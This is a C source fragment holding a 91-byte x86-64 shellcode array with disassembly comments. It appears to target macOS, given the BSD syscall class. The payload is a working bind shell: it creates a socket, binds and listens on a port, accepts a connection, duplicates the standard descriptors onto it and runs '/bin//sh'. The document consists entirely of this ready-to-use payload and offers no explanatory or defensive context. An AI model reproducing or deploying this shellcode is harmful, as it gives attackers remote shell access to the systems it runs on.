
// Target architecture : X86 64

#define BS_SIZE 91

char BS[] = {
  /* 0000 */ "\xb8\xff\xfd\xfb\x2d"                     /* mov     eax, 0x2dfbfdff         */
  /* 0005 */ "\xf7\xd0"                                 /* not     eax                     */
  /* 0007 */ "\x50"                                     /* push    rax                     */
  /* 0008 */ "\x31\xed"                                 /* xor     ebp, ebp                */
  /* 000A */ "\x0f\xba\xed\x19"                         /* bts     ebp, 0x19               */
  /* 000E */ "\x55"                                     /* push    rbp                     */
  /* 000F */ "\x58"                                     /* pop     rax                     */
  /* 0010 */ "\x99"                                     /* cdq                             */
  /* 0011 */ "\x6a\x01"                                 /* push    1                       */
  /* 0013 */ "\x5e"                                     /* pop     rsi                     */
  /* 0014 */ "\x6a\x02"                                 /* push    2                       */
  /* 0016 */ "\x5f"                                     /* pop     rdi                     */
  /* 0017 */ "\xb0\x61"                                 /* mov     al, 0x61                */
  /* 0019 */ "\x0f\x05"                                 /* syscall                         */
  /* 001B */ "\x97"                                     /* xchg    eax, edi                */
  /* 001C */ "\x93"                                     /* xchg    eax, ebx                */
  /* 001D */ "\x55"                                     /* push    rbp                     */
  /* 001E */ "\x58"                                     /* pop     rax                     */
  /* 001F */ "\x54"                                     /* push    rsp                     */
  /* 0020 */ "\x5e"                                     /* pop     rsi                     */
  /* 0021 */ "\xb2\x10"                                 /* mov     dl, 0x10                */
  /* 0023 */ "\xb0\x68"                                 /* mov     al, 0x68                */
  /* 0025 */ "\x0f\x05"                                 /* syscall                         */
  /* 0027 */ "\x50"                                     /* push    rax                     */
  /* 0028 */ "\x5e"                                     /* pop     rsi                     */
  /* 0029 */ "\x55"                                     /* push    rbp                     */
  /* 002A */ "\x58"                                     /* pop     rax                     */
  /* 002B */ "\xb0\x6a"                                 /* mov     al, 0x6a                */
  /* 002D */ "\x0f\x05"                                 /* syscall                         */
  /* 002F */ "\x55"                                     /* push    rbp                     */
  /* 0030 */ "\x58"                                     /* pop     rax                     */
  /* 0031 */ "\xb0\x1e"                                 /* mov     al, 0x1e                */
  /* 0033 */ "\x99"                                     /* cdq                             */
  /* 0034 */ "\x0f\x05"                                 /* syscall                         */
  /* 0036 */ "\x97"                                     /* xchg    eax, edi                */
  /* 0037 */ "\x53"                                     /* push    rbx                     */
  /* 0038 */ "\x5e"                                     /* pop     rsi                     */
  /* 0039 */ "\x55"                                     /* push    rbp                     */
  /* 003A */ "\x58"                                     /* pop     rax                     */
  /* 003B */ "\xb0\x5a"                                 /* mov     al, 0x5a                */
  /* 003D */ "\x0f\x05"                                 /* syscall                         */
  /* 003F */ "\x83\xee\x01"                             /* sub     esi, 1                  */
  /* 0042 */ "\x79\xf5"                                 /* jns     0x39                    */
  /* 0044 */ "\x31\xf6"                                 /* xor     esi, esi                */
  /* 0046 */ "\x99"                                     /* cdq                             */
  /* 0047 */ "\x48\xbb\x2f\x62\x69\x6e\x2f\x2f\x73\x68" /* movabs  rbx, 0x68732f2f6e69622f */
  /* 0051 */ "\x52"                                     /* push    rdx                     */
  /* 0052 */ "\x53"                                     /* push    rbx                     */
  /* 0053 */ "\x54"                                     /* push    rsp                     */
  /* 0054 */ "\x5f"                                     /* pop     rdi                     */
  /* 0055 */ "\x55"                                     /* push    rbp                     */
  /* 0056 */ "\x58"                                     /* pop     rax                     */
  /* 0057 */ "\xb0\x3b"                                 /* mov     al, 0x3b                */
  /* 0059 */ "\x0f\x05"                                 /* syscall                         */
};